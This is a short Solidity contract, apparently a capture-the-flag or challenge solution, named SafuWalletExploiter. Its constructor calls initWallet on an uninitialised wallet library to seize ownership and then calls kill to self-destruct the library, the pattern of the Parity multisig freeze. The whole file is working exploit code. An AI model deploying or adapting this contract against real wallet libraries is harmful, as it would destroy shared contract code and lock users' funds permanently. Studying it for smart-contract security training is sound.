// SPDX-License-Identifier: MIT

import { console } from "forge-std/console.sol";

pragma solidity ^0.8.0;

interface ISafuWalletLibrary {
    function kill(address _to) external;
}

contract SafuWalletExploiter {

    uint public m_required;

    constructor (address _safuWallet, address _safuWalletLibrary) {
        address[] memory addresses = new address[](1);
        addresses[0] = _safuWallet;
        bytes memory data = abi.encodeWithSignature(
            "initWallet(address[],uint256,uint256)",
            addresses,
            0,
            type(uint).max
        );

        (bool success,) = _safuWalletLibrary.call(data);
        require(success, "SafuWalletExploiter: failed to call initWallet");

        ISafuWalletLibrary(_safuWalletLibrary).kill(address(0));

    }
}